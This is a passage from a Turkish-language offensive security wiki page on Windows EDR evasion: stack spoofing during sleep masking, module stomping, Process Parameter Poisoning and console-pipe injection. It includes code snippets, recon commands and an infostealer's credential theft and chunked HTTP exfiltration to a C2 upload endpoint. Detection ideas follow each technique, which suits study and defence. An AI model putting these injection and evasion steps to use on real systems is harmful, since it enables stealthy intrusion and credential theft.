### Uyuyan thread'ler için CET-safe stack spoofing

Tam `CONTEXT` değiştirme işlemi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş `Rip` donanım shadow stack'iyle eşleşmeye devam etmelidir. Daha güvenli bir sleep-masking yöntemi şöyledir:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB'sini yedekleyin.
- `GetThreadContext` ile gerçek sleeping context'i yakalayın.
- Spoof context'e **yalnızca** gerçek `Rip`'i kopyalayın; spoof edilmiş `Rsp`/stack durumunu olduğu gibi bırakın.
- Sleep aralığında, stack walker'ların geçerli bir stack aralığında unwind yapması için spoof thread'in `NT_TIB`'sini mevcut TEB'ye kopyalayın.
- Bekleme tamamlandıktan sonra özgün TIB ve thread context'i geri yükleyin.

Bu yöntem CET ile uyumlu bir instruction pointer'ı korurken, unwind doğrulaması için TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### Alternatif: APC tabanlı Kraken Mask

Timer-queue dispatch fazla belirgin bir imzaya sahipse, aynı sleep-encrypt-spoof-restore dizisi kuyruğa alınmış APC'ler kullanan askıya alınmış bir yardımcı thread'den yürütülebilir:<sup>[[27]](#references)</sup>

- Entry point'i `NtTestAlert` olan bir yardımcı thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir durumunu yardımcı thread stack'i yerine heap'te saklayın.
- Başlangıç event'ini atomik olarak işaretleyip bloklamak için `NtSignalAndWaitForSingleObject` kullanın.
- TIB/context'i geri yüklemeden önce ana thread'i askıya alın (`NtSuspendThread` → restore → `NtResumeThread`); bu, scanner'ın yarı geri yüklenmiş bir stack'i yakalayabileceği yarış penceresini küçültür.

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını yardımcı thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` kullanılması.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısının ardından mevcut thread'in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüller içindeki dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrar tekrar kullanılması.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload'ları hedef süreçte zaten eşlenmiş bir DLL'in **`.text` section'ından** çalıştırır. Üzerine yazılacak hedef, süreçte hâlâ gereken code path'leri bozmadan payload'ı barındırabilecek **yüklenmiş, disk destekli bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modülleri safça stomp'lamak kırılgandır: DLL uzak süreçte yüklü olmayabilir ve code region'ın çok küçük olması süreci çökertebilir. Daha güvenilir bir iş akışı:

1. Hedef sürecin modüllerini sıralayın ve yalnızca zaten yüklenmiş DLL'leri içeren **yalnızca adlardan oluşan bir include list** tutun.
2. Önce payload'ı oluşturun ve **tam byte boyutunu** kaydedin.
3. Diskteki aday DLL'leri tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, dosya boyutundan daha önemlidir; çünkü yürütülebilir section'ın **belleğe eşlendiğindeki** boyutunu yansıtır.
4. **Export Address Table (EAT)**'i ayrıştırın ve stomp başlangıç offset'i olarak dışa aktarılan bir fonksiyon RVA'sı seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen fonksiyon sınırını aşarsa, bellekte ondan sonra yer alan bitişik export'ların üzerine yazılır.

Sahada görülen tipik recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Tercihen, `LoadLibrary`/beklenmeyen image load telemetry’sinden kaçınmak için uzak süreçte **zaten yüklü** olan DLL’leri kullanın.
- Hedef uygulama tarafından nadiren çalıştırılan export’ları tercih edin; aksi takdirde normal kod yolları, thread oluşturulmadan önce veya sonra stomp edilmiş baytlara erişebilir.
- Büyük implantlarda, tüm buffer’ın injector kaynak kodunda doğru şekilde temsil edilmesi için shellcode gömmeyi string literal yerine **byte-array/braced initializer** kullanacak şekilde değiştirmek gerekebilir.

Detection fikirleri
- Daha yaygın olan private RWX/RX allocation’lar yerine **image-backed executable page’lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan uzak yazmalar.
- Bellekteki baytları diskteki backing file ile artık eşleşmeyen export entry point’leri.
- Yakın zamanda ilk baytları değiştirilmiş meşru bir DLL export’u içinde çalıştırmaya başlayan remote thread’ler veya context pivot’ları.
- DLL `.text` page’lerine yönelik şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizilerini takip eden thread oluşturma.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolunu (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe baytları kopyalamak yerine, Windows’un seçili `CreateProcessW` başlangıç parametrelerini child process’e **kopyalayıp** `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması özelliğinden yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier’lar

Kullanışlı carrier’lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleği** işaret etmelidir ve null terminator dahil **32,767 Unicode karakterle** sınırlıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string’lerinden ve bunları sonlandıran fazladan bir `\0` karakterinden oluşan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak rezerve edilmiştir; bu nedenle `ShellInfo` eşlemesi, belgelenmiş sabit bir sözleşmeden ziyade bir implementation detail olarak değerlendirilmelidir.

Bu yaklaşım, normal process oluşturmayı **payload-transfer primitive** haline getirir. Operator, attacker-controlled başlangıç verileriyle child process’i oluşturur ve cross-process kopyalama işlemini Windows’a yaptırır.

### Remote write API’leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer’ı **read-only** primitive’lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`’i okuyun
3. `PEB.ProcessParameters`’ı takip edin
4. `RTL_USER_PROCESS_PARAMETERS`’ı okuyun
5. Seçili pointer’ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre arabelleğini yürütme

Kopyalanan parametre bölgesi genellikle yürütülebilir değil, `RW` olur. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülmüş olan ana iş parçacığı tanıtıcısını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` üzerine yazma) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; bağlam, döndürülen ana iş parçacığı tanıtıcısında doğrudan değiştirilebilir.

Bu yöntem, injection için yaygın olarak izlenen birkaç API’yi kullanmaktan kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null bayt sınırlaması ve aşamalı shellcode

Üç taşıyıcının da **string veya string benzeri veriler** olması nedeniyle `0x00` içeren ham bir payload aktarım sırasında kesilir. Pratik bir çözüm, sabit değerleri çalışma zamanında yeniden oluşturan ve ardından keyfi bir ikinci aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir yöntem, XOR tabanlı sabit değer sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın aktarılan parametreye null byte eklemeden stack üzerinde dizeler, API argümanları, DLL yolları veya ikinci aşama shellcode loader oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerekiyorsa şunları yapabilir:

- Dizeyi/buffer'ı hedef stack'e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göreli işaretçilere ayarlamak
- Çağrıdan önce `RSP` değerini **16-byte hizalı** tutmak

İkinci aşama daha sonra stack'ten bir `PAGE_READWRITE` ayırmasına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX ayırmasından kaçınarak çalıştırılmak üzere dallanılabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- **Process parameter** sayfalarını executable yapan `VirtualProtectEx` / `NtProtectVirtualMemory` çağrıları
- Bu koruma değişikliğinin ardından gelen `SetThreadContext` / `NtSetContextThread` çağrıları
- `PEB`'nin ve ardından `RTL_USER_PROCESS_PARAMETERS`'ın uzaktan okunması
- Process oluşturulurken olağandışı uzunlukta / yüksek entropili `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, tek başına tam bir execution primitive değil, **process'ler arası aktarım hilesidir**: Kopyalanan parametrenin hâlâ execute izni değişikliğine ve bir execution redirection yöntemine ihtiyacı vardır.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlar tarafından değerlendirilmiş, ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere başvurduğu için reddedilmiştir.

## Console STDIN pipe injection

Etkileşimli bir console child, **payload-transfer primitive** olarak da kullanılabilir. Injector, child'ın standard input'unu bir pipe'a yönlendirir ve bir marker'ın ardından shellcode gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'i bu buffer'a yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler; ancak genel bir EDR bypass değil, yine de process injection'dır.<sup>[[41]](#references)</sup>

"Named-pipe" açıklamasına rağmen referans uygulama, **anonymous pipe** oluşturan `CreatePipe`'ı çağırır. Windows, anonymous pipe'ları dahili olarak benzersiz adlara sahip pipe nesneleriyle uygular; ancak PoC ne `\\.\pipe\<name>` yolunu seçer ne de `CreateNamedPipe` çağırır. Varsayılan bir güvenlik tanımlayıcısıyla devralınabilir handle'lar oluşturur, okuma handle'ını `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarlar ve handle devralma etkinleştirilmiş olarak yeni bir child başlatır. Dolayısıyla bu PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir process'e bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Uygulama şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT`'u için anonymous pipe çiftleri oluşturun. Parent tarafındaki iki handle'da devralma özelliğini devre dışı bırakın ve process oluşturulduktan sonra parent'taki child tarafı kopyalarını kapatın.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlatın. Child, yönlendirilmiş standart handle'ları devralır.
3. `WriteFile` ile parent tarafındaki `STDIN` handle'ı üzerinden tam `rawData` binary dizisini gönderin. Console programı byte'ları tüketir ve kopyasını özel commit edilmiş bölgelerinden birinde bırakır.
4. `VirtualQueryEx` ile child'ın adres alanını tarayın, `ReadProcessMemory` ile aday `MEM_PRIVATE` bölgelerini okuyun ve `rawData`'nın başlangıcındaki marker'ı arayın.
5. Bulunan buffer'ın korumasını `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştirin.
6. Ana thread'i belirleyin, askıya alın, `NtSetContextThread` ile `RIP`'i `found_address + 0x19` olarak ayarlayın ve thread'i devam ettirin.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özgüdür: `CONTEXT.Rip` değerini değiştirir ve gömülü payload'ı x64 shellcode'dur. `rawData` 25 baytlık bir marker ile başlar; bu nedenle çalıştırılabilir baytlar onaltılık `0x19` offset'inde başlar. Payload'ı değiştirirken bu düzeni koruyun veya marker'ı, arama vektörünü, dizi boyutunu ve çalıştırma offset'ini birlikte güncelleyin. Kaynak yorumlarında ayrıca `0x0A`, `0x0D` ve `0x1A` bad character olarak listelenmiştir. Bu iş akışı çocuğun token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük native yardımcılar ve payload derleme kalıpları için [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) sayfasına bakın.

## Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için SantaStealer Taktikleri

SantaStealer (BluelineStealer olarak da bilinir), modern info-stealer'ların AV bypass, anti-analysis ve kimlik bilgilerine erişimi tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Klavye düzenine göre filtreleme ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Kiril alfabesi kullanan bir düzen bulunursa örnek, stealer'ları çalıştırmadan önce boş bir `CIS` marker'ı bırakıp sonlanır; böylece hariç tutulan yerel ayarlarda asla tetiklenmez ve avlama için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- Variant A, işlem listesini dolaşır; her adı özel bir rolling checksum ile hash’ler ve sonucu debugger/sandbox’lar için gömülü blocklist’lerle karşılaştırır. Bilgisayar adı üzerinde checksum işlemini tekrarlar ve `C:\analysis` gibi çalışma dizinlerini denetler.
- Variant B, sistem özelliklerini inceler (işlem sayısı alt sınırı, yakın zamandaki çalışma süresi), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve tek adımlı yürütmeyi fark etmek amacıyla beklemeler çevresinde zamanlama kontrolleri gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Dosyasız yardımcı + çift ChaCha20 ile reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium kimlik bilgisi yardımcısı içerir; dosyasız modda yardımcı, hiçbir yardımcı dosya oluşturmadan import ve relocation işlemlerini kendisi çözümler.
- Bu yardımcı, ikinci aşama bir DLL’i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme geçişinden sonra blob’u reflective olarak yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) temel alınarak oluşturulmuş `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator yordamları, çalışan bir Chromium tarayıcısına enjekte olmak, AppBound Encryption anahtarlarını devralmak ve ABE güçlendirmelerine rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartı bilgilerini doğrudan çözmek için direct-syscall reflective process hollowing kullanır.

### Modüler bellek içi toplama ve parçalı HTTP ile veri sızdırma

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin modül başına bir thread başlatır (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı eklentileri vb.). Her thread sonuçları paylaşılan arabelleklerde tutar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statik olarak bağlanmış `miniz` kütüphanesi kullanılarak `%TEMP%\\Log.zip` dosyasına sıkıştırılır. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi, tarayıcıya ait `multipart/form-data` sınırını (`----WebKitFormBoundary***`) taklit ederek HTTP POST üzerinden `http://<C2>:6767/upload` adresine 10 MB’lık parçalar halinde gönderir. Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı `w: <campaign_tag>` eklenir; son parçaya ise C2’nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack’ler: malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – belgeler](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni bulaşma zinciri ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust yaklaşımınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell’den önce: Storm-2603’ün önceki ransomware operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded export’lardan yararlanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – İşlem güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL başlatıcısı](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR’lere karşı koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender’ın koruyucu kabuğunu kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Saf perdenin ardında: RAT’ten builder’a, oradan coder’a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption şifre çözme](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API tracing ile Node.js malware’ini alt etme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uyuyan Güzel: Crystal Palace ile Adaptix’i uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uyuyan Güzel II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW’nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop’tan yararlanma: Uygulamalı bir kılavuz](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender’ın remediation driver’ını kernel operasyonu primitive’i olarak silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo yardımcı kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak self-masking fonksiyonları oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe işlevi](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş giriş ve çıkışla bir child process oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
